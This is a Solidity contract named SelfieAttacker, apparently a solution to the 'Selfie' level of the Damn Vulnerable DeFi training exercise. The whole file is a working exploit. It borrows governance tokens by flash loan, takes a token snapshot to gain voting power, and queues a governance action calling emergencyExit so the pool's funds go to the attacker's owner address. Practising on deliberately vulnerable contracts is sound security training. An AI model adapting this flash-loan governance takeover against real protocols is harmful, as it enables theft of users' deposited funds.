// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "solmate/src/auth/Owned.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker is IERC3156FlashBorrower, Owned {
    SimpleGovernance gov;
    DamnValuableTokenSnapshot tok;
    SelfiePool pool;
    uint256 public actionId;

    constructor(
        SimpleGovernance _gov,
        DamnValuableTokenSnapshot _tok,
        SelfiePool _pool
    ) Owned(msg.sender) {
        gov = _gov;
        tok = _tok;
        pool = _pool;
    }

    function attack(uint256 amount) external payable {
        pool.flashLoan(this, address(tok), amount, "0x");
    }

    function test() external {}

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        ERC20(token).increaseAllowance(msg.sender, amount + fee);

        tok.snapshot();
        actionId = gov.queueAction(
            msg.sender,
            0,
            abi.encodeCall(SelfiePool.emergencyExit, (address(this.owner())))
        );

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
